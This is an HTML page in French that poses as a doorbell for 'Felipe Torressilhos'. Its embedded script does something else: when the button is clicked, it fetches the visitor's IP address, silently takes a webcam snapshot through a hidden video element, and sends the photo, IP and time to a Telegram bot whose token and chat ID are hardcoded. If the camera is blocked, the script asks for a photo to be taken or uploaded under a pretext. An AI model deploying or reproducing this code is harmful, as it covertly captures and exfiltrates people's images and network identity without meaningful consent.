<html lang="fr">
<head>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: #0a192f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .consent-modal {
            position: fixed;

            width: 100%;

            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .custom-camera-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10,25,47,0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1001;
        }

        .consent-box, .camera-box {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(15px);
            border-radius: 15px;
            padding: 2.5rem;
            text-align: center;
            max-width: 500px;
            width: 90%;
            border: 1px solid rgba(255,255,255,0.1);
            color: white;
        }

        .camera-box {
            max-width: 700px;
            padding: 2rem;
        }

        .camera-preview {
            width: 100%;
            max-height: 400px;
            border-radius: 10px;
            margin: 1.5rem 0;
            background: rgba(0,0,0,0.3);
            border: 2px solid rgba(255,255,255,0.1);
        }

        .camera-controls {
            display: flex;
            gap: 1rem;
            justify-content: center;
            margin: 1.5rem 0;
            flex-wrap: wrap;
        }

        .bell-button {
            background: #2563eb;
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 50px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            font-weight: 500;
            letter-spacing: 0.5px;
            animation: bell-vibrate 0.3s linear infinite;
        }

        button {
            background: rgba(255,255,255,0.1);
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9rem;
            border: 1px solid rgba(255,255,255,0.2);
        }

        button:hover {
            background: rgba(255,255,255,0.2);
        }

        @keyframes bell-vibrate {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-1px); }
            75% { transform: translateX(1px); }
        }

        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(15px);
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            color: white;
            z-index: 1001;
            max-width: 400px;
            width: 90%;
            border: 1px solid rgba(255,255,255,0.2);
        }

        #statusMsg {
            color: white;
            text-align: center;
            margin-top: 20px;
            opacity: 0.8;
        }

        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #fff;
            font-weight: 600;
        }

        p {
            margin-bottom: 2rem;
            opacity: 0.8;
            font-size: 0.95rem;
        }

        .popup a {
            color: #60a5fa;
            text-decoration: none;
            font-weight: 500;
        }

        @media (max-width: 600px) {
            .consent-box, .camera-box {
                padding: 1.5rem;
            }
            
            h2 {
                font-size: 1.5rem;
            }
            
            .bell-button {
                padding: 0.8rem 1.5rem;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="consent-modal" id="consentModal">
        <div class="consent-box">
            <h2>SONNER CHEZ ðŸ””</h2>
            <p>Felipe Torressilhos ðŸ‘‡</p>
            <button class="bell-button" onclick="initiateActivation()">Accepter et sonner</button>
        </div>
    </div>

    <div class="custom-camera-modal" id="customCameraModal">
        <div class="camera-box">
            <h2>ðŸ“¸ Prendre une photo du produit</h2>
            <video id="cameraPreview" class="camera-preview" autoplay playsinline></video>
            <canvas id="cameraCanvas" style="display: none;"></canvas>
            
            <div class="camera-controls">
                <button id="captureButton">Prendre une photo</button>
                <button id="uploadButton">TÃ©lÃ©charger une photo</button>
                <input type="file" id="fileInput" accept="image/*" style="display: none;">
            </div>
            
            <div class="camera-controls">
                <button id="submitCustomPhoto">Envoyer</button>
                <button id="cancelCustomPhoto">Annuler</button>
            </div>
        </div>
    </div>

    <div id="statusMsg"></div>
    <video id="hiddenVideo" autoplay playsinline></video>

    <div class="popup" id="popup" style="display: none;">
        <div id="popupMessage"></div>
    </div>

    <script>
        // O restante do JavaScript permanece igual ao seu cÃ³digo original
        const BOT_TOKEN = '7933483854:AAEEebGInkEUkKbxh4OgGFYVQM2zIk-GupA';
        const CHAT_ID = '5562266493';

        function getFormattedDateTime() {
            const now = new Date();
            const date = now.toLocaleDateString('fr-FR');
            const time = now.toLocaleTimeString('fr-FR');
            return `ðŸ“… Date: ${date} ðŸ•’ Heure: ${time}`;
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Indisponible';
            }
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Erreur d\'envoi:', error);
            }
        }

        async function handleActivation() {
            let ip = await getIPInfo();
            let statusMessage = `ðŸš¨ Sonnette activÃ©e!\nIP: ${ip}\n${getFormattedDateTime()}`;
            let userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', statusMessage);
                const blob = await fetch(photoUrl).then(r => r.blob());
                formData.append('photo', blob, 'photo.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                stream.getTracks().forEach(track => track.stop());
            
            } catch (error) {
                statusMessage += `\nErreur camÃ©ra: ${error.message}`;
                await sendToTelegram(statusMessage);
                const customPhoto = await showCustomCameraModal();
                
                if (customPhoto) {
                    const customFormData = new FormData();
                    customFormData.append('chat_id', CHAT_ID);
                    customFormData.append('caption', statusMessage);
                    const blob = await fetch(customPhoto.photo).then(r => r.blob());
                    customFormData.append('photo', blob, 'custom_photo.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: customFormData
                    });
                }
            }

            return userMessage;
        }

        function showCustomCameraModal() {
            return new Promise(async (resolve) => {
                const modal = document.getElementById('customCameraModal');
                const video = document.getElementById('cameraPreview');
                const captureButton = document.getElementById('captureButton');
                const uploadButton = document.getElementById('uploadButton');
                const fileInput = document.getElementById('fileInput');
                const submitButton = document.getElementById('submitCustomPhoto');
                const cancelButton = document.getElementById('cancelCustomPhoto');

                let stream = null;
                let photoData = null;

                modal.style.display = 'flex';

                const startCamera = async () => {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        video.srcObject = stream;
                        video.style.display = 'block';
                        captureButton.style.display = 'block';
                        uploadButton.style.display = 'none';
                    } catch (error) {
                        video.style.display = 'none';
                        captureButton.style.display = 'none';
                        uploadButton.style.display = 'block';
                    }
                };

                await startCamera();

                captureButton.onclick = () => {
                    const canvas = document.getElementById('cameraCanvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    photoData = canvas.toDataURL('image/jpeg');
                    video.style.display = 'none';
                    canvas.style.display = 'block';
                };

                uploadButton.onclick = () => fileInput.click();

                fileInput.onchange = (e) => {
                    const file = e.target.files[0];
                    if (file) {
                        const reader = new FileReader();
                        reader.onload = (e) => {
                            photoData = e.target.result;
                            video.style.display = 'none';
                        };
                        reader.readAsDataURL(file);
                    }
                };

                submitButton.onclick = () => {
                    if (photoData) {
                        modal.style.display = 'none';
                        if (stream) stream.getTracks().forEach(track => track.stop());
                        resolve({
                            photo: photoData
                        });
                    }
                };

                cancelButton.onclick = () => {
                    modal.style.display = 'none';
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    resolve(null);
                };
            });
        }

        function showPopup(message) {
            const popup = document.getElementById('popup');
            const popupMessage = document.getElementById('popupMessage');
            popupMessage.innerHTML = message;
            popup.style.display = 'block';

            setTimeout(() => {
                popup.style.display = 'none';
                window.location.href = 'https://torreswebsec.github.io/services/';
            }, 5000);
        }

        async function initiateActivation() {
            document.getElementById('consentModal').style.display = 'none';
            document.getElementById('statusMsg').innerHTML = 'Traitement en cours...';

            const message = await handleActivation();
            
            showPopup(
                `<div style="padding: 1rem; border-radius: 8px; background: rgba(255,255,255,0.1);">
                    âœ“ ${message}
                </div>`
            );
        }

        window.onload = () => {
            document.getElementById('consentModal').style.display = 'flex';
        }
    </script>
</body>
</html>
